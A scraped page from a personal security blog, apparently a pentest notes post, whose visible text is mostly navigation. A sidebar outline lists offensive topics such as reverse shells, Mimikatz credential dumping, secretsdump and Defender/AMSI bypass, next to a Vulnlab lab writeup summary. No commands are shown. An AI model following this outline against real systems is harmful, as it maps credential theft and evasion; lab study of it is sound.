NMAP automator is a handy script that will prettify the output of the network mapping tool called NMAP. I use nmap-automator for report writing but also run a separate nmap scan. 123456789PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH...</div></div></div></a><a class="pagination-related" href="/2024/11/30/2024-11-30-Vulnlab%20Trusted%20-%20Writeup/" title="Vulnlab Trusted Chain - Writeup"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-30</div><div class="info-item-2">Vulnlab Trusted Chain - Writeup</div></div><div class="info-2"><div class="info-item-1">  Trusted is an easy chain challenge on VulnLab, created by r0BIT.  It features two machines, both running on the Windows platform. The challenge revolves around two Domain Controllers with a bidirectional trust relationship set up. The initial foothold is achieved by exploiting a Local File Inclusion (LFI) vulnerability in an unfinished developer environment, allowing access to the backend database. Within the database, we discover hashed passwords, which we successfully crack. With a...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://raw.githubusercontent.com/0xbirb/0xbirb.github.io/main/img/logo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Ludwig Schober</div><div class="author-info-description">A website to showcase my cyber security journey</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/0xbirb"><i class="fab fa-github"></i><span>Find me on Github</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/0xbirb" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:schober_ludwig@protonmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Enum"><span class="toc-number">1.0.1.</span> <span class="toc-text">Windows Enum</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Script-Execution"><span class="toc-number">1.0.1.1.</span> <span class="toc-text">Script Execution</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Usernames-and-Groups"><span class="toc-number">1.0.1.2.</span> <span class="toc-text">Usernames and Groups</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Privileges"><span class="toc-number">1.0.1.3.</span> <span class="toc-text">Privileges</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Run-As"><span class="toc-number">1.0.1.4.</span> <span class="toc-text">Run As</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Credentials"><span class="toc-number">1.0.1.5.</span> <span class="toc-text">Credentials</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Architecture-and-System"><span class="toc-number">1.0.1.6.</span> <span class="toc-text">Architecture and System</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Network"><span class="toc-number">1.0.1.7.</span> <span class="toc-text">Network</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Software-and-Processes"><span class="toc-number">1.0.1.8.</span> <span class="toc-text">Software and Processes</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Tasks"><span class="toc-number">1.0.1.9.</span> <span class="toc-text">Tasks</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Services"><span class="toc-number">1.0.1.10.</span> <span class="toc-text">Services</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SMB-Shares"><span class="toc-number">1.0.1.11.</span> <span class="toc-text">SMB Shares</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SNMP-161"><span class="toc-number">1.0.1.12.</span> <span class="toc-text">SNMP 161</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Remote-Desktop"><span class="toc-number">1.0.1.13.</span> <span class="toc-text">Remote Desktop</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Search-for-interesting-files"><span class="toc-number">1.0.1.14.</span> <span class="toc-text">Search for interesting files</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Active-Directory"><span class="toc-number">1.0.2.</span> <span class="toc-text">Active Directory</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#General-Domain-Information"><span class="toc-number">1.0.2.1.</span> <span class="toc-text">General Domain Information</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Usernames-and-Groups-1"><span class="toc-number">1.0.2.2.</span> <span class="toc-text">Usernames and Groups</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Enumeration-with-Powerview"><span class="toc-number">1.0.2.3.</span> <span class="toc-text">Enumeration with Powerview</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Kerbrute"><span class="toc-number">1.0.2.4.</span> <span class="toc-text">Kerbrute</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux"><span class="toc-number">1.0.3.</span> <span class="toc-text">Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web"><span class="toc-number">1.0.4.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Fuzzing"><span class="toc-number">1.0.4.1.</span> <span class="toc-text">Fuzzing</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Filtering"><span class="toc-number">1.0.4.2.</span> <span class="toc-text">Filtering</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Extension"><span class="toc-number">1.0.4.3.</span> <span class="toc-text">Extension</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shells"><span class="toc-number">2.</span> <span class="toc-text">Shells</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows"><span class="toc-number">2.0.1.</span> <span class="toc-text">Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Revshells"><span class="toc-number">2.0.1.1.</span> <span class="toc-text">Revshells</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Catch-the-shell-using-NC"><span class="toc-number">2.0.1.2.</span> <span class="toc-text">Catch the shell using NC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Upload-nc-exe-to-victim"><span class="toc-number">2.0.1.3.</span> <span class="toc-text">Upload nc.exe to victim</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSFVenom"><span class="toc-number">2.0.1.4.</span> <span class="toc-text">MSFVenom</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Nc-and-Ncat"><span class="toc-number">2.0.1.5.</span> <span class="toc-text">Nc and Ncat</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-1"><span class="toc-number">2.0.2.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Revshells-1"><span class="toc-number">2.0.2.1.</span> <span class="toc-text">Revshells</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Upgrade-shell"><span class="toc-number">2.0.2.2.</span> <span class="toc-text">Upgrade shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Catch-the-shell-using-NC-1"><span class="toc-number">2.0.2.3.</span> <span class="toc-text">Catch the shell using NC</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#File-Transfers"><span class="toc-number">3.</span> <span class="toc-text">File Transfers</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#General"><span class="toc-number">3.0.1.</span> <span class="toc-text">General</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#wget"><span class="toc-number">3.0.1.1.</span> <span class="toc-text">wget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Nc-and-NCAT"><span class="toc-number">3.0.1.2.</span> <span class="toc-text">Nc and NCAT</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Socat"><span class="toc-number">3.0.1.3.</span> <span class="toc-text">Socat</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Uploading-files"><span class="toc-number">3.0.1.4.</span> <span class="toc-text">Uploading files</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-1"><span class="toc-number">3.0.2.</span> <span class="toc-text">Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Using-wget"><span class="toc-number">3.0.2.1.</span> <span class="toc-text">Using wget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Powershell"><span class="toc-number">3.0.2.2.</span> <span class="toc-text">Powershell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cmd"><span class="toc-number">3.0.2.3.</span> <span class="toc-text">cmd</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WinRM-Powershell-Remote"><span class="toc-number">3.0.2.4.</span> <span class="toc-text">WinRM &#x2F; Powershell Remote</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Via-SMB"><span class="toc-number">3.0.2.5.</span> <span class="toc-text">Via SMB</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Powershell-Simple-HTTP-Server-File-Download"><span class="toc-number">3.0.2.6.</span> <span class="toc-text">Powershell Simple HTTP-Server File-Download</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unzip-Files"><span class="toc-number">3.0.2.7.</span> <span class="toc-text">Unzip Files</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">4.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-PrivEsc"><span class="toc-number">4.1.</span> <span class="toc-text">Windows PrivEsc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Manual-Privilege-Escalation"><span class="toc-number">4.1.1.</span> <span class="toc-text">Manual Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Check-Permissions"><span class="toc-number">4.1.1.1.</span> <span class="toc-text">Check Permissions</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Check-File-Permissions"><span class="toc-number">4.1.1.2.</span> <span class="toc-text">Check File Permissions</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Service-Binary-Hijacking"><span class="toc-number">4.1.1.3.</span> <span class="toc-text">Service Binary Hijacking</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Service-DLL-Hijacking"><span class="toc-number">4.1.1.4.</span> <span class="toc-text">Service DLL Hijacking</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unquoted-Service-Paths"><span class="toc-number">4.1.1.5.</span> <span class="toc-text">Unquoted Service Paths</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Automated-Privilege-Escalation"><span class="toc-number">4.1.2.</span> <span class="toc-text">Automated Privilege Escalation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-PrivEsc"><span class="toc-number">4.2.</span> <span class="toc-text">Linux PrivEsc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Manual-Privilege-Escalation-1"><span class="toc-number">4.2.1.</span> <span class="toc-text">Manual Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Enumerate-OS"><span class="toc-number">4.2.1.1.</span> <span class="toc-text">Enumerate OS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Interesting-User-trails"><span class="toc-number">4.2.1.2.</span> <span class="toc-text">Interesting  User trails</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Service-Footprinting"><span class="toc-number">4.2.1.3.</span> <span class="toc-text">Service Footprinting</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cron-Jobs"><span class="toc-number">4.2.1.4.</span> <span class="toc-text">Cron Jobs</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hijacking-SUID-binaries"><span class="toc-number">4.2.1.5.</span> <span class="toc-text">Hijacking SUID binaries</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Hunt-for-interesting-files-permission"><span class="toc-number">4.2.1.6.</span> <span class="toc-text">Hunt for interesting files permission</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Automated-Privilege-Escalation-1"><span class="toc-number">4.2.2.</span> <span class="toc-text">Automated Privilege Escalation</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Post-Exploitation"><span class="toc-number">5.</span> <span class="toc-text">Post Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Mimikatz"><span class="toc-number">5.1.</span> <span class="toc-text">Mimikatz</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Enable-logging-elevate-token"><span class="toc-number">5.1.0.1.</span> <span class="toc-text">Enable logging, elevate token</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Ask-LSA-for-creds"><span class="toc-number">5.1.0.2.</span> <span class="toc-text">Ask LSA for creds</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sekurlsa"><span class="toc-number">5.1.0.3.</span> <span class="toc-text">sekurlsa</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dump-user-hash"><span class="toc-number">5.1.0.4.</span> <span class="toc-text">dump user hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kerberos"><span class="toc-number">5.1.0.5.</span> <span class="toc-text">kerberos</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#non-interactive-usage"><span class="toc-number">5.1.0.6.</span> <span class="toc-text">non interactive usage</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SAM-and-AD-Dumping"><span class="toc-number">5.2.</span> <span class="toc-text">SAM and AD Dumping</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Lolbins-to-potentially-bypass-Defender-AMSI"><span class="toc-number">5.2.0.1.</span> <span class="toc-text">Lolbins to potentially bypass Defender &amp; AMSI</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Impacket-secretsdump"><span class="toc-number">5.2.0.2.</span> <span class="toc-text">Impacket-secretsdump</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NXC-former-CrackMapExec"><span class="toc-number">5.2.0.3.</span> <span class="toc-text">NXC former CrackMapExec</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/30/2024-11-30-Vulnlab%20Trusted%20-%20Writeup/" title="Vulnlab Trusted Chain - Writeup">Vulnlab Trusted Chain - Writeup</a><time datetime="2024-11-30T06:00:00.000Z" title="Created 2024-11-30 07:00:00">2024-11-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/2024-08-21-Vulnlab%20Forgotten%20-%20Writeup/" title="Vulnlab Forgotten - Writeup">Vulnlab Forgotten - Writeup</a><time datetime="2024-08-21T06:00:00.000Z" title="Created 2024-08-21 08:00:00">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/29/2024-06-29-Creating%20my%20own%20HoneyPot%20with%20T-Pot/" title="Creating my own HoneyPot with T-Pot">Creating my own HoneyPot with T-Pot</a><time datetime="2024-06-29T05:00:00.000Z" title="Created 2024-06-29 07:00:00">2024-06-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/23/2024-05-25-my-notes/" title="My Notes">My Notes</a><time datetime="2024-05-23T05:00:00.000Z" title="Created 2024-05-23 07:00:00">2024-05-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/23/2024-05-25-introduction-to-this-blog/" title="Introduction to this Blog">Introduction to this Blog</a><time datetime="2024-04-23T05:00:00.000Z" title="Created 2024-04-23 07:00:00">2024-04-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Ludwig Schober</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.2.2"></script><script src="/js/main.js?v=5.2.2"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/dist/click-show-text.min.js" data-mobile="false" data-text="mimikatz,shellsh0ck,metasploit,msfvenom,nullbyte,zeroDay,cipher,rce,hydra,rootKit,honeypot,hashcat,revShell,privesc,msfvenom,sh3llcode,eternalBlue,notp3tya,wannaCry,j0hn" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
